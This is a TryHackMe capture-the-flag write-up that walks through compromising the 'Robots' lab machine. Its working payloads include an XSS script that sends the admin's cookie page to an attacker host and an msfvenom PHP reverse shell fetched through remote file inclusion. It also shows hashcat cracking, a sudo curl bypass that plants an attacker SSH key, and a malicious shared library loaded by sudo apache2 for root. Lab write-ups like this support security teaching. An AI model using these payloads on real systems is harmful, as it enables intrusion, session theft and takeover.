# TryHackMe "Robots" Machine Compromise Write-up


This detailed write-up outlines the entire process of compromising the "Robots" machine on TryHackMe, from initial reconnaissance to gaining root access. It provides every command, the rationale behind tool usage, and explanations of the vulnerabilities exploited.


---


## Overall Attack Methodology


Our approach to compromising the "Robots" machine followed a structured penetration testing methodology:


1.  **Reconnaissance & Enumeration:** Systematically gathering information about the target to identify potential attack vectors and exposed services.

2.  **Initial Foothold:** Gaining a low-privileged presence on the target system by exploiting a web application vulnerability.

3.  **Lateral Movement & Internal Enumeration:** Pivoting from the initial web server shell to access an internal database, cracking credentials, and gaining access to another user account via SSH.

4.  **Privilege Escalation:** Elevating privileges from the compromised user to `root` by exploiting a `sudo` misconfiguration.


---


## Phase 1: Initial Reconnaissance and Web Enumeration


**Objective:** Discover open ports, running services, and web application details to identify potential entry points.


### Tools & Commands Used:


* **OpenVPN:** To establish network connectivity to the TryHackMe lab.

* **`ping`:** For basic network reachability checks.

* **Nmap:** For comprehensive port scanning and service version detection.

* **Web Browser (e.g., Firefox):** For visual exploration of web applications.

* **`curl`:** A command-line tool for making HTTP requests and retrieving web content.

* **Text Editor (e.g., `nano`):** To modify the `/etc/hosts` file for domain resolution.


### Steps:


1.  **Establish VPN Connectivity:**

    * **Action:** Connect your attacking machine (Kali Linux) to the TryHackMe OpenVPN network. This is crucial for accessing the target.

    * **Command:**

        ```bash

        sudo openvpn /path/to/your/thm_vpn_config.ovpn

        ```

    * **Observation:** Note your attacking machine's VPN IP address (e.g., `10.8.0.x`). This will be our `<YOUR_ATTACKER_IP>` throughout the attack.


2.  **Identify and Verify Target Reachability:**

    * **Action:** Confirm the target machine's IP address (e.g., `10.10.x.x`) from the TryHackMe task page and verify connectivity.

    * **Command:**

        ```bash

        ping -c 4 <TARGET_IP>

        ```

    * **Observation:** A successful `ping` confirms reachability. Pay attention to the TTL, which was 64, often indicative of a Linux system or a containerized environment.


3.  **Comprehensive Port and Service Scan with Nmap:**

    * **Action:** Perform a detailed Nmap scan to identify all open TCP ports, their services, and versions.

    * **Command:**

        ```bash

        nmap -sC -sV -p- <TARGET_IP>

        ```

        * `-sC`: Runs default Nmap scripts for enumeration and vulnerability checks.

        * `-sV`: Attempts to determine service versions.

        * `-p-`: Scans all 65535 TCP ports.

    * **Key Observations:**

        * **Port 22 (SSH):** Open, running OpenSSH.

        * **Port 80 (HTTP):** Open, Apache. Returned "forbidden," hinted at Debian. Nmap also flagged `robots.txt`.

        * **Port 9000 (HTTP):** Open, Apache. Showed an Ubuntu system. This was a separate web application.

        * **Port 3306 (MySQL):** Open.


4.  **Investigate `robots.txt` for Hidden Paths:**

    * **Action:** Access the `robots.txt` file on port 80.

    * **Command:**

        ```bash

        curl http://<TARGET_IP>/robots.txt

        ```

    * **Observation:** The file contained `Disallow` entries: `/harming_humans`, `/ignoring_human_orders`, and `/harm_to_self`.


5.  **Probe Disallowed Entries for Information Disclosure:**

    * **Action:** Attempt to access each disallowed path.

    * **Command (example):**

        ```bash

        curl http://<TARGET_IP>/harm_to_self

        ```

    * **Observation:** While two paths were "Forbidden," `/harm_to_self` unexpectedly redirected to `http://robots.thm`. This revealed a new, unlisted domain name.


6.  **Update `/etc/hosts` for Domain Resolution:**

    * **Action:** To resolve `robots.thm` locally, add it to your `/etc/hosts` file.

    * **Command:**

        ```bash

        sudo nano /etc/hosts

        ```

    * **Add Line:**

        ```

        <TARGET_IP> robots.thm

        ```


7.  **Browse the `robots.thm` Web Application:**

    * **Action:** Open `http://robots.thm` in your web browser. This loads the web application on port 9000.

    * **Observation:** The page presented a "recruitment campaign" with "Register" and "Login." Crucial hints were present:

        * "Admin monitors new users." (Implies admin interaction with registrations.)

        * "Initial password is MD5 hash of username + date of birth (DDMM)." (Key for password cracking later.)

        * A visible link to `server_info.php`.


8.  **Investigate `server_info.php` for Information Disclosure:**

    * **Action:** Access `http://robots.thm/server_info.php`.

    * **Observation:** The page explicitly displayed the current session cookie (`PHPSESSID`) within its HTML content.


9.  **Test for Cross-Site Scripting (XSS) on Registration Page:**

    * **Action:** Navigate to `http://robots.thm/register` and attempt to register a new user with an XSS payload in the "Username" field.

    * **Payload Example:**

        ```html

        <script>alert(1)</script>

        ```

    * **Observation:** An `alert(1)` popup appeared, confirming a **Reflective XSS vulnerability**.


10. **Check Cookie `HTTPOnly` Flag:**

    * **Action:** Using browser developer tools, inspect the `PHPSESSID` cookie for `robots.thm`.

    * **Observation:** The `HTTPOnly` flag was set to `true`.

    * **Reasoning:** This prevents direct JavaScript access to `document.cookie`. However, since `server_info.php` *prints* the cookie, we can still leverage XSS to make the admin's browser fetch that page and exfiltrate its content.


---


## Phase 2: Initial Foothold via XSS and RFI


**Objective:** Steal the admin's session cookie using XSS, then exploit a Remote File Inclusion (RFI) vulnerability in the admin panel to gain a reverse shell.


### Tools & Commands Used:


* **Python's `http.server`:** To host malicious JavaScript (`xss.js`) and PHP files (`shell.php`, `test.php`).

* **Netcat (`nc`):** To set up listeners for both the stolen XSS data and the incoming reverse shell connection.

* **Text Editor:** For creating `xss.js`, `test.php`, and `shell.php`.

* **Browser Cookie Editor:** To inject the stolen admin cookie into the attacker's browser.

* **`msfvenom` (optional):** To generate the PHP reverse shell payload.


### Steps:


1.  **Attacker Setup: Python Web Server and Netcat Listener:**

    * **Action:** Set up a local web server to host our payloads and a Netcat listener to capture data.

    * **Step 1.1: Create a Payload Directory:**

        ```bash

        mkdir ~/robots_payloads && cd ~/robots_payloads

        ```

    * **Step 1.2: Start the Python Web Server:** From within `~/robots_payloads/`.

        ```bash

        python3 -m http.server 80

        ```

        * **Reasoning:** This simple command makes all files in the current directory accessible via HTTP from your `<YOUR_ATTACKER_IP>`. Port 80 is standard for web traffic.

    * **Step 1.3: Start Netcat Listener for XSS Data:** Open a **new terminal tab/window**.

        ```bash

        nc -lvnp 9001

        ```


2.  **Create `xss.js` (XSS Payload):**

    * **Action:** Create `xss.js` in your `~/robots_payloads/` directory.

    * **Code for `xss.js`:**

        ```javascript

        fetch('[http://robots.thm/server_info.php](http://robots.thm/server_info.php)') // Request the page containing the cookie

          .then(response => response.text())      // Get response body as text

          .then(data => {

            var base64data = btoa(data);           // Base64 encode the content

            // Send the encoded content to our Netcat listener

            fetch('http://<YOUR_ATTACKER_IP>:9001/?data=' + base64data);

          });

        ```

    * **Reasoning:** When executed in the admin's browser, this script fetches `server_info.php` (which contains the `PHPSESSID`), Base64-encodes its entire content, and then sends that encoded string to our `nc` listener.


3.  **Inject XSS Payload via Registration:**

    * **Action:** On `http://robots.thm/register`, input the XSS payload in the "Username" field.

    * **Payload:**

        ```html

        <script src="http://<YOUR_ATTACKER_IP>/xss.js"></script>

        ```

    * **Reasoning:** When the admin views this registered username (as implied by "Admin monitors new users"), their browser executes the script, loading `xss.js` from our Python web server.


4.  **Capture and Decode Admin Cookie:**

    * **Action:** Monitor your Netcat listener (`nc -lvnp 9001`).

    * **Observation:** The listener receives a GET request with a `data=` parameter containing the Base64-encoded `server_info.php` content.

    * **Decode Base64 (example output and command):**

        ```

        GET /?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiAgIDwhLS0gPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PgogIDx0ZXh0YXJlYSBuYW1lPSJjb29raWVzIiByZWFkb25seSBjb2xzPSIxMDYgcm93cz0iNSI+PHBIUFNFU1NJRD02MjRjNzY1YzM5NzliMDliNWM2M2Q0YzgxMjAxZGNhYTwvc2NyaXB0Pg== HTTP/1.1

        ```

        ```bash

        echo "PASTE_BASE64_STRING_HERE" | base64 -d

        ```

    * **Result:** Extract the `PHPSESSID` (e.g., `624c765c3979b09b5c63d4c81201dcac`).


5.  **Impersonate Admin with Stolen Cookie:**

    * **Action:** Use a browser extension (like "Cookie Editor") to replace your `PHPSESSID` for `robots.thm` with the stolen admin's `PHPSESSID`.

    * **Action:** Navigate to `http://robots.thm/admin.php`.

    * **Observation:** You'll now be logged into the admin panel, which has a "URL testing" feature.


6.  **Test for Remote File Inclusion (RFI) via URL Testing:**

    * **Action:** The "URL testing" feature is suspicious. Test it by having the target web server download and execute a simple PHP file from your machine.

    * **Step 6.1: Create a Test PHP File:** In `~/robots_payloads/`, create `test.php`.

        ```php

        <?php system("echo VULNERABLE"); ?>

        ```

    * **Step 6.2: Input URL in `admin.php`:**

        ```

        http://<YOUR_ATTACKER_IP>/test.php

        ```

    * **Reasoning:** The `admin.php` script makes an outbound HTTP request to your Python server (using `curl`, `wget`, or similar internally), downloads `test.php`, and then executes the PHP code.

    * **Observation:** "VULNERABLE" appeared on the page, confirming **RFI**. We further confirmed with `cat /etc/passwd`.


7.  **Generate and Host a PHP Reverse Shell:**

    * **Action:** Create a PHP reverse shell script and place it in `~/robots_payloads/` (e.g., `shell.php`).

    * **Command (using `msfvenom`):**

        ```bash

        msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_ATTACKER_IP> LPORT=4444 -f raw > ~/robots_payloads/shell.php

        ```

    * **Note:** Ensure `shell.php` contains your attacker IP and a listening port (e.g., 4444).


8.  **Start Netcat Listener for Reverse Shell:**

    * **Action:** Open a **third terminal tab/window**.

    * **Command:**

        ```bash

        nc -lvnp 4444

        ```


9.  **Trigger the Reverse Shell:**

    * **Action:** In the `admin.php` "URL testing" feature, input the URL to your hosted PHP reverse shell.

    * **Command (in `admin.php` form):**

        ```

        http://<YOUR_ATTACKER_IP>/shell.php

        ```

    * **Reasoning:** The target web server downloads and executes `shell.php` from your Python server, causing it to connect back to your `nc` listener.

    * **Observation:** Your Netcat listener receives a connection, granting you a shell as the **`www-data`** user.


10. **Stabilize the Shell:**

    * **Action:** Upgrade the limited Netcat shell to a fully interactive TTY shell.

    * **Commands (executed in `www-data` shell):**

        ```bash

        python3 -c 'import pty; pty.spawn("/bin/bash")'

        # Press Ctrl+Z

        stty raw -echo; fg

        export TERM=xterm

        stty rows <your_terminal_rows> columns <your_terminal_columns>

        ```


---


## Phase 3: Lateral Movement to Database and User Escalation


**Objective:** Identify database credentials, access the internal MySQL database, crack user passwords, and pivot to the `argiscard` user via SSH.


### Tools & Commands Used:


* **`find` / `ls` / `cat`:** For file system enumeration and viewing file contents.

* **`cat /proc/net/arp`:** To discover internal network addresses in the Docker environment.

* **`nc`:** For basic internal port scanning.

* **chisel:** A fast TCP/UDP tunnel, used for port forwarding.

* **`mysql` client:** To interact with the MySQL database.

* **Hashcat:** For cracking password hashes.

* **`ssh`:** To connect to the target system as the newly compromised user.

* **Python's `http.server`:** To serve the `chisel` binary for transfer.


### Steps:


1.  **Locate Database Credentials (`config.php`):**

    * **Action:** From your `www-data` shell, search for database configuration files.

    * **Command:**

        ```bash

        find / -name "config.php" 2>/dev/null

        # Then, once found:

        cat /var/www/html/config.php

        ```

    * **Observation:** Found credentials: `username: robots`, `password: this_is_a_strong_password_for_a_db`.


2.  **Enumerate Internal Network IPs (Docker Environment):**

    * **Action:** Discover other IPs within the internal Docker network, as MySQL wasn't externally accessible.

    * **Command:**

        ```bash

        cat /proc/net/arp

        ```

    * **Observation:** Identified internal IPs like `172.18.0.1`, `172.18.0.2`, `172.18.0.3`.


3.  **Port Scan Internal IPs for MySQL (Port 3306):**

    * **Action:** Confirm which internal IP is running MySQL.

    * **Command:**

        ```bash

        for ip in 172.18.0.{1..3}; do echo "Checking $ip"; nc -vz $ip 3306 2>&1 | grep succeed; done

        ```

    * **Observation:** Port 3306 (MySQL) was open on `172.18.0.2`.


4.  **Transfer Chisel to Target for Port Forwarding:**

    * **Action:** Download `chisel` to your attacker machine and serve it with your Python web server, then download it to the target.

    * **Step 4.1: Download Chisel to Attacker:**

        ```bash

        wget [https://github.com/jpillora/chisel/releases/download/v1.x.x/chisel_1.x.x_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.x.x/chisel_1.x.x_linux_amd64.gz) # Adjust version

        gunzip chisel_*.gz

        mv chisel_linux_amd64 ~/robots_payloads/

        ```

    * **Step 4.2: Transfer Chisel to Target (from `www-data` shell):**

        ```bash

        cd /tmp; wget http://<YOUR_ATTACKER_IP>/chisel_linux_amd64

        chmod +x chisel_linux_amd64

        ```


5.  **Configure and Initiate Chisel Tunnel:**

    * **Action:** Set up the `chisel` server on your attacker machine and the client on the target.

    * **Step 5.1: Start Chisel Server on Attacker (New Terminal):**

        ```bash

        ./chisel server --reverse --port 1818

        ```

    * **Step 5.2: Start Chisel Client on Target (from `www-data` shell):**

        ```bash

        /tmp/chisel_linux_amd64 client <YOUR_ATTACKER_IP>:1818 3306:172.18.0.2:3306

        ```

    * **Reasoning:** This creates a tunnel, forwarding `127.0.0.1:3306` on your Kali machine to `172.18.0.2:3306` on the target's internal network.


6.  **Access MySQL Database via Forwarded Port:**

    * **Action:** Connect to the MySQL database from your attacking machine.

    * **Command:**

        ```bash

        mysql -h 127.0.0.1 -P 3306 -u robots -p

        ```

    * **Input Password:** `this_is_a_strong_password_for_a_db`


7.  **Enumerate MySQL Database for User Information:**

    * **Action:** Query the database for user data.

    * **Commands (inside `mysql>` prompt):**

        ```sql

        show databases;

        use web;

        show tables;

        select * from users;

        ```

    * **Observation:** The `users` table contained usernames (`admin`, `argiscard`) and MD5-like password hashes.


8.  **Understand Password Hashing Scheme for Cracking:**

    * **Recall Hint:** "Initial password is MD5 hash of username + date of birth (DDMM)."

    * **Deduction:** The hash format is `MD5(MD5(username + DDMM))`. This is **Hashcat mode 2600**.


9.  **Crack `argiscard`'s Password with Hashcat:**

    * **Action:** Save the `argiscard` hash to `~/robots_payloads/hashes.txt`.

    * **Command (executed on attacker machine):**

        ```bash

        hashcat -m 2600 -a 3 ~/robots_payloads/hashes.txt "argiscard?d?d?d" --outfile cracked.txt --force

        ```

        * `-m 2600`: MD5(MD5($pass)).

        * `-a 3`: Mask attack.

        * `"argiscard?d?d?d"`: Mask for `username + three digits`.

    * **Observation:** Hashcat cracked the password: **`argiscard209`**.


10. **SSH into `argiscard`:**

    * **Action:** Log in as `argiscard` using the cracked password.

    * **Command:**

        ```bash

        ssh argiscard@<TARGET_IP>

        ```

    * **Input Password:** `argiscard209`

    * **Observation:** Successfully gained access as `argiscard`.


---


## Phase 4: Privilege Escalation to `dooly_vow`


**Objective:** Escalate privileges from `argiscard` to `dooly_vow` by exploiting a `sudo` vulnerability with `curl` and SSH key injection.


### Tools & Commands Used:


* **`sudo`:** To check user privileges and execute commands as other users.

* **`ssh-keygen`:** To generate SSH key pairs.

* **`curl`:** To transfer files to the target machine (leveraging a `sudo` vulnerability).

* **Python's `http.server`:** To host the SSH public key.


### Steps:


1.  **Enumerate `sudo` Privileges for `argiscard`:**

    * **Action:** Check what `sudo` commands `argiscard` can run.

    * **Command:**

        ```bash

        sudo -l

        ```

    * **Observation:** `argiscard` could execute `/usr/bin/curl` as `dooly_vow` **without a password**, but *only* for URLs starting with `127.0.0.1`.


2.  **Generate SSH Key Pair for `dooly_vow`:**

    * **Action:** Generate a new SSH key pair on your attacker machine.

    * **Command (executed on attacker machine):**

        ```bash

        ssh-keygen -b 4096 -t rsa -f ~/robots_payloads/dooly_rsa

        ```

    * **Reasoning:** We'll push `dooly_rsa.pub` to `dooly_vow`'s `authorized_keys` for passwordless SSH.


3.  **Ensure Public Key is Hosted on Attacker's Python Web Server:**

    * **Action:** Confirm `dooly_rsa.pub` is in `~/robots_payloads/` and your Python web server is running.


4.  **Craft and Execute `curl` Command for SSH Key Transfer (Bypass):**

    * **Action:** This command leverages `curl`'s ability to handle multiple URLs and form data combined with Bash process substitution to bypass the `127.0.0.1` restriction.

    * **Command (executed as `argiscard` on the target machine):**

        ```bash

        sudo -u dooly_vow /usr/bin/curl --output-dir /home/dooly_vow/.ssh/ --output authorized_keys \

        [http://127.0.0.1/dummy_file](http://127.0.0.1/dummy_file) -F 'file=@<(curl -s http://<YOUR_ATTACKER_IP>/dooly_rsa.pub)'

        ```

        * `http://127.0.0.1/dummy_file`: Satisfies the `sudo` policy's URL restriction.

        * `-F 'file=@<(curl -s http://<YOUR_ATTACKER_IP>/dooly_rsa.pub)'`: Uses process substitution (`<(...)`) to fetch the actual public key from our Python server, and `curl` treats its output as data to write to `authorized_keys`.

    * **Reasoning:** The outer `sudo curl` command appears to comply with the `127.0.0.1` rule, but the inner `curl` effectively retrieves our public key from the attacker's machine, allowing its content to be written to the `dooly_vow`'s `authorized_keys`.


5.  **SSH into `dooly_vow`:**

    * **Action:** Log in using your new private key.

    * **Command:**

        ```bash

        ssh -i ~/robots_payloads/dooly_rsa dooly_vow@<TARGET_IP>

        ```

    * **Observation:** Successfully logged in as **`dooly_vow`**.

    * **Action:** Retrieve `user.txt`.

    * **Command:**

        ```bash

        cat /home/dooly_vow/user.txt

        ```


---


## Phase 5: Privilege Escalation to Root


**Objective:** Exploit a `sudo` vulnerability with `apache2` to gain a root shell.


### Tools & Commands Used:


* **`sudo`:** To check `sudo` privileges and execute commands as root.

* **Text Editor:** To write the malicious C code for the shared library.

* **`gcc`:** The GNU C Compiler, used to compile the malicious C code into a shared library.

* **`curl`:** To transfer the compiled shared library to the target.

* **Python's `http.server`:** To host the compiled shared library.


### Steps:


1.  **Enumerate `sudo` Privileges for `dooly_vow`:**

    * **Action:** Check `dooly_vow`'s `sudo` privileges.

    * **Command:**

        ```bash

        sudo -l

        ```

    * **Observation:** `dooly_vow` could execute `/usr/sbin/apache2` as `root` **without a password**. This is a powerful misconfiguration.


2.  **Create Malicious Shared Library (`malicious.c`):**

    * **Action:** Create a C file on your attacker machine that will spawn a shell when loaded. Save it in `~/robots_payloads/`.

    * **Code for `malicious.c`:**

        ```c

        #include <stdio.h>

        #include <stdlib.h>


        void __attribute__ ((constructor)) init_library(void) {

            system("/bin/bash"); // Execute a bash shell when loaded

        }

        ```

    * **Reasoning:** The `__attribute__((constructor))` ensures `init_library` runs automatically when the shared library is loaded by a program.


3.  **Compile Malicious Shared Library:**

    * **Action:** Compile `malicious.c` into a shared library (`.so` file).

    * **Command (executed on attacker machine):**

        ```bash

        gcc -shared -o ~/robots_payloads/malicious.so ~/robots_payloads/malicious.c -fPIC

        ```

        * `-shared`: Creates a shared library.

        * `-o malicious.so`: Output filename.

        * `-fPIC`: Generates position-independent code, necessary for shared libraries.


4.  **Transfer Malicious Shared Library to Target:**

    * **Action:** Transfer the compiled `malicious.so` to the target. Ensure your Python web server is still running.

    * **Command (executed as `dooly_vow` on the target):**

        ```bash

        cd /home/dooly_vow

        curl -o malicious.so http://<YOUR_ATTACKER_IP>/malicious.so

        ```


5.  **Execute `apache2` to Load Malicious Library and Obtain Root Shell:**

    * **Action:** Use `sudo` to run `apache2` as root, forcing it to load your malicious shared library.

    * **Command (executed as `dooly_vow` on the target):**

        ```bash

        sudo /usr/sbin/apache2 -X -d /etc/apache2 -f apache2.conf -c "LoadModule malicious_module /home/dooly_vow/malicious.so"

        ```

        * `-X`: Runs Apache in single-process mode, keeping the shell attached to your terminal.

        * `-c "LoadModule malicious_module /home/dooly_vow/malicious.so"`: Injects a configuration directive to load your `malicious.so` as an Apache module.

    * **Reasoning:** When `apache2` starts as `root` and loads `malicious.so`, the `init_library` function executes, spawning `/bin/bash` with inherited `root` privileges.

    * **Observation:** A **root shell** prompt (`#`) appears in your terminal.


6.  **Retrieve Root Flag:**

    * **Action:** Navigate to `/root` and read the `root.txt` file.

    * **Commands:**

        ```bash

        cd /root

        ls

        cat root.txt

        ```


--- 
